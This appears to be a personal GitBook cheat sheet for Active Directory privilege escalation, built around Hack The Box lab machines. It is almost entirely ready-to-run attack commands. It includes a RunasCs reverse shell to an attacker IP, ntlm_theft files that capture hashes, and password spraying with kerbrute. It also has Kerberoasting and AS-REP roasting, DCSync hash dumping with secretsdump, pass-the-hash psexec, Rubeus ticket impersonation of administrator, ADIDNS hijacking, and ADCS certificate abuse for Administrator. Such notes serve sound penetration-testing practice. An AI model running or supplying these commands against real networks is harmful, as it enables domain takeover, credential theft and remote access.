# AD PrivEsc

dc-ip you aclly gotta add the dc dns name too to hosts eg. dc.manager.htb or sum

printer config -> return \[easy]

krbrelayx, so many relays in impacket itself \[ntlmrelayx]

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>

{% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg" %}
Ultimate AD Mindmap
{% endembed %}

### Bloodhound

```
./SharpHound.exe --CollectionMethod All
bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
```

#### SharpGPOAbuse - Modify Group Policy Objects

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
gpupdate /force
```

#### RunAs - Sudo for Windows

```
.\RunasCs.exe "[user]" '[password]' powershell.exe -r 10.10.14.2:9001
```

#### gMSADumper - Reads any gMSA password blobs the user can access

```
python3 gMSADumper.py -u '[user]' -p '[password]' -d [domain]
```

#### pyLAPS - Read LAPS if user has the privilege

```
python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
```

#### NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed

```
python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
```

### Rubeus

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}

```
.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
.\Rubeus.exe klist
.\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx
.\Rubeus.exe tgtdeleg /nowrap
```

## Kerberos

```
./kerbrute_linux_amd64 passwordspray -d FRIZZ.HTB ~/htb/rooms/frizz/output.txt '!suBcig@MehTed!R' --dc 'FRIZZDC.FRIZZ.HTB'
./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 
```

#### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)

Regular users create child objects by default, attackers can leverage that and hijack traffic - no need to be DNS Admin for this

```
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
```

### Impacket

#### GetNPUsers - ASREP Roasting for users with no pre-auth

{% code title="18200" %}
```
python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
./GetNPUsers.py -no-pass -dc-ip [ip] -request '[domain]/[user]'
```
{% endcode %}

#### GetUserSPN - find Service Principal Names that are associated with normal user account

```
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>
```

#### SecretsDump - Dump admin hashes if DCSync privileges enabled

```
sudo python3 secretsdump.py [domain]/[user]@[ip]
sudo python3 secretsdump.py -k -no-pass [host_domain] -just-dc-user [user] #Using KRB5CCNAME
```

#### getTGT - request a TGT and save it as ccache

```
python3 getTGT.py -dc-ip [ip] [domain]/'[user]':'[password]'
```

#### getST - request a Service Ticket and save it as ccache

```
python3 getST.py -spn [SPN] [-impersonate administrator] -hashes [hash] -dc-ip [ip] [domain]/[user]
```

#### PSexec - Semi shell that writes to $ADMIN share

```
export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
python3 psexec.py -hashes [hash] [user]@[ip] cmd.exe 
```

{% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}

#### TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files and vice-versa

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
./ticketConverter.py ticket.kirbi ticket.ccache
```

### AD CS (Certificate Service)

```
certipy-ad find -dc-ip [ip] -ns [ip] -u [user]@[domain] -p '[password]' -vulnerable -stdout
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M adcs
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
